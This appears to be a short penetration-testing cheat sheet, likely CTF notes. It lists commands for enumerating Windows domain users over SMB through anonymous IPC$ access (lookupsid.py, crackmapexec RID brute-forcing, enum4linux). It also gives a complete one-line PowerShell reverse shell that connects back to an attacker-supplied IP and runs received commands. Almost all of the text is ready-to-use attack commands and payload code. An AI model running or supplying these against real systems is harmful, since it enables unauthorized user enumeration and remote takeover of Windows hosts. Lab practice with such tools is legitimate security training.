**when enumerate smb shares and we have read access to ```IPC$``` share, We will be able to list the domain users as ```anonymous``` using different tools:**

1- ```lookupsid.py anonymous@<target ip>```<br>
#OR<br>
```lookupsid.py <username>@<target ip>``` #if we have valid creds <br>

2- ```crackmapexec smb <target ip> -u 'guest' -p '' --rid-brute```

----------------------------------------------------------------------------------------------------------------------

**if we do not know the domain name we could use ```crackmapexec``` to dump some cool information:**
```
crackmapexec smb <target ip>
                                                                  
SMB         10.10.250.17    445    VULNNET-BC3TCK1  [*] Windows 10.0 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False)
```
#OR 
Use ```enum4linux```:
```
enum4linux <target ip>
```
----------------------------------------------------------------------------------------------------------------------

**Powershell reverse shell**

```
$client = New-Object System.Net.Sockets.TCPClient('<OUR ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

----------------------------------------------------------------------------------------------------------------------

